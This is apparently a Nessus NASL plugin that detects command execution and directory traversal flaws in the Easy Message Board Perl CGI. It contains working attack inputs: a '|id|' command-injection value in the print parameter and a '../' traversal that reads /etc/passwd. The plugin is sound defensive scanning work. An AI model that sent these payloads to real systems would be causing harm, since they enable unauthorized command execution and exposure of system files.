#
#
# (C) Noam Rathaus GPLv2
#

# SoulBlack Group <soulblacktm@gmail.com>
# 2005-05-09 00:59
# Easy Message Board Directory Traversal and Remote Command

if(description)
{
 script_id(18211);
 script_version ("$Revision: 1.3 $");

 script_cve_id("CAN-2005-1549", "CAN-2005-1550");
 script_bugtraq_id(13555, 13551);
 
 name["english"] = "Easy Message Board Command Execution";
 script_name(english:name["english"]);
 
 desc["english"] = '
The remote host is running Easy Message Board, a bulletin board system
written in perl.

The remote version of this script contains an input validation flaw which
may be used by an attacker to perform a directory traversal attack
or execute arbitrary commands on the remote host with the privileges of
the web server.

Solution : Upgrade to the newest version of this CGI or disable it
Risk factor : High';

 script_description(english:desc["english"]);
 
 summary["english"] = "Checks for Easy Message Board";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_GATHER_INFO);
 
 script_copyright(english:"This script is Copyright (C) 2005 Noam Rathaus");
 family["english"] = "CGI abuses";
 script_family(english:family["english"]);
 script_dependencie("http_version.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");
include("global_settings.inc");

port = get_http_port(default:80);
if(!get_port_state(port))exit(0);

foreach d (cgi_dirs())
{
 req = http_get(item:string(d, "/easymsgb.pl?print=|id|"), port:port);
 res = http_keepalive_send_recv(port:port, data:req);
 if ( res == NULL ) exit(0);
 if(egrep(pattern:"uid=[0-9].*gid=[0-9]", string:res) )
 {
  security_hole(port);
  exit(0);
 }


 if ( thorough_tests )
 {
 req = http_get(item:d + "/easymsgb.pl?print=../../../../../../../etc/passwd", port:port);
 res = http_keepalive_send_recv(port:port, data:req);
 if ( res == NULL ) exit(0);
 if(egrep(pattern:"root:.*:0:[01]:", string:res))
	{ security_hole(port); exit(0); }
 }


}

